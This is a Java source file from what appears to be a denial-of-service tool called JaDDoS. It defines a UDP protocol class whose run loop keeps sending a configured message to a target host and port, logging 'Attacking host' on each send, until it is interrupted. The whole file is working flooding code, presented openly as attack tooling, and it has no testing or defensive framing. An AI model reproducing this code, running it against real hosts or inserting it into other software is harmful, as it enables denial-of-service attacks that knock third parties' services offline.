package com.jaddos.protocol;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

import org.apache.log4j.Logger;

import com.jaddos.core.JaDDoS;
import com.jaddos.core.JaDDoSPattern;

/**
 * @author SonoD
 *
 */
public class JaDDoSUDPProtocol extends JaDDoS implements IJaDDoSUDPProtocol {

	private Logger logger = Logger.getLogger(JaDDoSUDPProtocol.class);

	private DatagramSocket socket;
	private DatagramPacket packet;

	public JaDDoSUDPProtocol(JaDDoSPattern ddosPattern) {
		super(ddosPattern);
	}

	@Override
	public void run() {
		createSocket();
		connectToSocket();

		while (!Thread.currentThread().isInterrupted() && !socket.isClosed()) {
			writeLineToSocket(getDdosPattern().getMessage());
			logger.info("Attacking host " + getDdosPattern().getHost() + ":" + getDdosPattern().getPort());

			try {
				Thread.sleep(getDdosPattern().getTimeout());
			} catch (InterruptedException e) {
				logger.error("Unable to perform the attack: " + e.getMessage(), e);
			}
		}
		closeSocket();

	}

	@Override
	public void writeLineToSocket(String message) {
		byte[] data = message.getBytes();
		getPacket().setData(data);
		getPacket().setLength(data.length);
		try {
			getSocket().send(getPacket());
		} catch (IOException e) {
			logger.error("Unable to connect to socket: " + e.getMessage(), e);
		}
	}

	@Override
	protected void createSocket() {
		try {
			socket = new DatagramSocket(0);
			socket.setSoTimeout(getDdosPattern().getSocketTimeout());
		} catch (SocketException e) {
			logger.error("Unable to connect to socket: " + e.getMessage(), e);
		}

	}

	@Override
	protected void connectToSocket() {
		setAddress(new InetSocketAddress(getDdosPattern().getHost(), getDdosPattern().getPort()));
		packet = new DatagramPacket(new byte[1], 1, getAddress());

	}

	@Override
	protected void closeSocket() {
		if (socket != null && !socket.isClosed() && socket.isBound()) {
			socket.close();
		}

	}

	@Override
	public DatagramSocket getSocket() {
		return socket;
	}

	@Override
	public void setSocket(DatagramSocket socket) {
		this.socket = socket;

	}

	@Override
	public DatagramPacket getPacket() {
		return packet;
	}

	@Override
	public void setPacket(DatagramPacket packet) {
		this.packet = packet;

	}

}
